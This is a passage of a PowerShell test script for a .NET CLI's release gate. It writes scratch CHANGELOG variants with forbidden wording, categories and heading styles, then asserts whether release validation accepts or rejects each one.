    [IO.File]::WriteAllText($nestedReleaseChangelog, $nestedReleaseFirstRelease, [Text.UTF8Encoding]::new($false))
    Assert-ValidationRejects 'first-release entry nested under Unreleased' (Invoke-ReleaseValidation -Version $version -ChangelogPath $nestedReleaseChangelog -RequireFinalized -FirstRelease)

    $candidateChangelog = Join-Path $scratch 'CHANGELOG.finalized.md'
    $candidateFirstRelease = "# Changelog`n`n## [Unreleased]`n`n## [$version] - $releaseDate`n`n### Added`n`n- Initial release capability review.`n"
    [IO.File]::WriteAllText($candidateChangelog, $candidateFirstRelease, [Text.UTF8Encoding]::new($false))
    Assert-ValidationPass 'real project with finalized version-consistent first-release changelog' (Invoke-ReleaseValidation -Version $version -ChangelogPath $candidateChangelog -RequireFinalized -FirstRelease)

    # Compose the same documentation and release-contract checks used by the
    # publication gate against a concise finalized first-release entry. The
    # changelog is intentionally not copied into fixed-sentence parity: release
    # validation owns its semantic/version contract.
    if (-not (Test-Path -LiteralPath $builtCliPath -PathType Leaf)) { throw 'Built CLI is missing for the composed release-gate test.' }
    $helpPath = Join-Path $scratch 'built-help.txt'
    $help = @(& dotnet $builtCliPath --help 2>&1)
    if ($LASTEXITCODE -ne 0) { throw "Built CLI help failed with exit code $LASTEXITCODE." }
    [IO.File]::WriteAllText($helpPath, ($help -join [Environment]::NewLine), [Text.UTF8Encoding]::new($false))

    $composedRoot = Join-Path $scratch 'composed-release-gate'
    foreach ($relative in @(
        'README.md',
        'CHANGELOG.md',
        'SECURITY.md',
        'docs/DEV.md',
        'src/KeelMatrix.PackageSurface.Cli/README.md',
        'src/KeelMatrix.PackageSurface.Cli/CommandLine.cs'
    )) {
        $destination = Join-Path $composedRoot $relative
        New-Item -ItemType Directory -Force -Path (Split-Path -Parent $destination) | Out-Null
        Copy-Item -LiteralPath (Join-Path $root $relative) -Destination $destination
    }
    Copy-Item -LiteralPath $candidateChangelog -Destination (Join-Path $composedRoot 'CHANGELOG.md') -Force
    $documentationOutput = @(Invoke-NestedPwsh -NoLogo -NoProfile -File (Join-Path $root 'scripts/test-cli-documentation.ps1') -RepositoryRoot $composedRoot -BuiltHelpTextPath $helpPath 2>&1)
    $documentationExitCode = $LASTEXITCODE
    if ($documentationExitCode -ne 0) {
        throw "Composed release documentation gate failed with exit code ${documentationExitCode}: $($documentationOutput -join [Environment]::NewLine)"
    }
    Assert-ValidationPass 'composed finalized first-release gate' (Invoke-ReleaseValidation -Version $version -ChangelogPath (Join-Path $composedRoot 'CHANGELOG.md') -RequireFinalized -FirstRelease)

    $wholeWordChangelog = Join-Path $scratch 'CHANGELOG.whole-word.md'
    [IO.File]::WriteAllText($wholeWordChangelog, "# Changelog`n`n## [Unreleased]`n`n## [$version] - $releaseDate`n`n### Added`n`n- Adds package prefixes and nowhere-only documentation examples.`n", [Text.UTF8Encoding]::new($false))
    Assert-ValidationPass 'first-release whole-word marker boundaries' (Invoke-ReleaseValidation -Version $version -ChangelogPath $wholeWordChangelog -RequireFinalized -FirstRelease)

    foreach ($marker in @('now', 'no longer', 'previously', 'formerly', 'used to', 'fixed', 'fixes', 'corrected', 'resolved', 'addressed', 'this removes', 'this fixes', 'changed from')) {
        $markerChangelog = Join-Path $scratch ('CHANGELOG.marker-' + ($marker -replace '[^A-Za-z0-9]+', '-') + '.md')
        [IO.File]::WriteAllText($markerChangelog, "# Changelog`n`n## [Unreleased]`n`n## [$version] - $releaseDate`n`n### Added`n`n- $marker release wording.`n", [Text.UTF8Encoding]::new($false))
        Assert-ValidationRejects "first-release remediation marker '$marker'" (Invoke-ReleaseValidation -Version $version -ChangelogPath $markerChangelog -RequireFinalized -FirstRelease)
    }

    foreach ($category in @('Changed', 'Fixed', 'Deprecated', 'Removed', 'Security', 'Compatibility')) {
        $categoryChangelog = Join-Path $scratch ('CHANGELOG.category-' + $category + '.md')
        [IO.File]::WriteAllText($categoryChangelog, "# Changelog`n`n## [Unreleased]`n`n## [$version] - $releaseDate`n`n### Added`n`n- Initial release capability review.`n`n### $category`n`n- Release note.`n", [Text.UTF8Encoding]::new($false))
        Assert-ValidationRejects "first-release category '$category'" (Invoke-ReleaseValidation -Version $version -ChangelogPath $categoryChangelog -RequireFinalized -FirstRelease)
    }
    foreach ($heading in @('Notes', 'Metadata')) {
        $headingChangelog = Join-Path $scratch ('CHANGELOG.heading-' + $heading + '.md')
        [IO.File]::WriteAllText($headingChangelog, "# Changelog`n`n## [Unreleased]`n`n## [$version] - $releaseDate`n`n### Added`n`n- Initial release capability review.`n`n#### $heading`n`n- Release note.`n", [Text.UTF8Encoding]::new($false))
        Assert-ValidationRejects "first-release unknown heading '$heading'" (Invoke-ReleaseValidation -Version $version -ChangelogPath $headingChangelog -RequireFinalized -FirstRelease)
    }
    $h1HeadingChangelog = Join-Path $scratch 'CHANGELOG.h1-heading.md'
    [IO.File]::WriteAllText($h1HeadingChangelog, "# Changelog`n`n## [Unreleased]`n`n## [$version] - $releaseDate`n`n### Added`n`n- Initial release capability review.`n`n# Notes`n`n- Release note.`n", [Text.UTF8Encoding]::new($false))
    Assert-ValidationRejects 'first-release unknown level-one heading' (Invoke-ReleaseValidation -Version $version -ChangelogPath $h1HeadingChangelog -RequireFinalized -FirstRelease)
    $h1AddedChangelog = Join-Path $scratch 'CHANGELOG.h1-added.md'
    [IO.File]::WriteAllText($h1AddedChangelog, "# Changelog`n`n## [Unreleased]`n`n## [$version] - $releaseDate`n`n# Added`n`n- Initial release capability review.`n", [Text.UTF8Encoding]::new($false))
    Assert-ValidationRejects 'first-release level-one Added heading' (Invoke-ReleaseValidation -Version $version -ChangelogPath $h1AddedChangelog -RequireFinalized -FirstRelease)

    $setextHeadingChangelog = Join-Path $scratch 'CHANGELOG.setext-heading.md'
    [IO.File]::WriteAllText($setextHeadingChangelog, "# Changelog`n`n## [Unreleased]`n`n## [$version] - $releaseDate`n`n### Added`n`n- Initial release capability review.`n`nNotes`n-----`n`n- This heading must be rejected.`n", [Text.UTF8Encoding]::new($false))
    Assert-ValidationRejects 'first-release setext category heading' (Invoke-ReleaseValidation -Version $version -ChangelogPath $setextHeadingChangelog -RequireFinalized -FirstRelease)

    $setextDocumentHeadingChangelog = Join-Path $scratch 'CHANGELOG.setext-document-heading.md'
    [IO.File]::WriteAllText($setextDocumentHeadingChangelog, "# Changelog`n`n## [Unreleased]`n`n## [$version] - $releaseDate`n`n### Added`n`n- Initial release capability review.`n`nNotes`n=====`n`n- This document heading must be rejected.`n", [Text.UTF8Encoding]::new($false))
    Assert-ValidationRejects 'first-release setext document heading' (Invoke-ReleaseValidation -Version $version -ChangelogPath $setextDocumentHeadingChangelog -RequireFinalized -FirstRelease)

    $fencedHeadingChangelog = Join-Path $scratch 'CHANGELOG.fenced-heading.md'
    [IO.File]::WriteAllText($fencedHeadingChangelog, "# Changelog`n`n## [Unreleased]`n`n## [$version] - $releaseDate`n`n### Added`n`n- Initial release capability review.`n`n~~~markdown`n# Notes`n`nNotes`n-----`n~~~`n", [Text.UTF8Encoding]::new($false))
    Assert-ValidationPass 'first-release fenced headings ignored' (Invoke-ReleaseValidation -Version $version -ChangelogPath $fencedHeadingChangelog -RequireFinalized -FirstRelease)

    $indentedHeadingChangelog = Join-Path $scratch 'CHANGELOG.indented-heading.md'
    [IO.File]::WriteAllText($indentedHeadingChangelog, "# Changelog`n`n## [Unreleased]`n`n## [$version] - $releaseDate`n`n### Added`n`n- Initial release capability review.`n`n    # Notes`n    Notes`n    -----`n", [Text.UTF8Encoding]::new($false))
    Assert-ValidationPass 'first-release indented code headings ignored' (Invoke-ReleaseValidation -Version $version -ChangelogPath $indentedHeadingChangelog -RequireFinalized -FirstRelease)

    $mismatchedChangelog = Join-Path $scratch 'CHANGELOG.mismatched.md'
    [IO.File]::WriteAllText($mismatchedChangelog, "# Changelog`n`n## [Unreleased]`n`n## [9.9.9] - $releaseDate`n`n- Wrong version.`n", [Text.UTF8Encoding]::new($false))
    Assert-ValidationRejects 'changelog/version disagreement' (Invoke-ReleaseValidation -Version $version -ChangelogPath $mismatchedChangelog -RequireFinalized -FirstRelease)

    Write-Output 'PASS: restored CI/release workflows use one shared fail-closed release contract; real candidate, finalized, and version-mismatch cases behave as required.'
}
finally {
    if (Test-Path -LiteralPath $scratch) { Remove-Item -LiteralPath $scratch -Recurse -Force }
}
